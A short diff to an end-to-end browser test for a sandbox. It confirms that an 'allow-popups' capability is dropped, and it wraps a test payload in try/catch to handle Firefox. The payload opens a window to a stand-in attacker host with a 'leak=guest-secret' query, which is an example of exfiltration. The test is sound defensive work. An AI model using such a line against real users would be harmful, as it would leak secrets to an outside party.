@@ -6,7 +6,8 @@ import { test, expect } from '../../../test/e2e/fixture';
  */
 
 const ATTACKER = 'http://attacker.test';
-const OPEN_POPUP = `window.open('${ATTACKER}/?leak=guest-secret'); console.log('POPUP_TRIED');`;
+// Firefox throws when popups are not allowed; the other engines return null
+const OPEN_POPUP = `try { window.open('${ATTACKER}/?leak=guest-secret'); } catch (e) {} console.log('POPUP_TRIED');`;
 
 test('13.1 allow-popups passed as a regular capability is dropped, so no popup leaves', async ({ sandbox, context, page }) => {
     const reached: string[] = [];
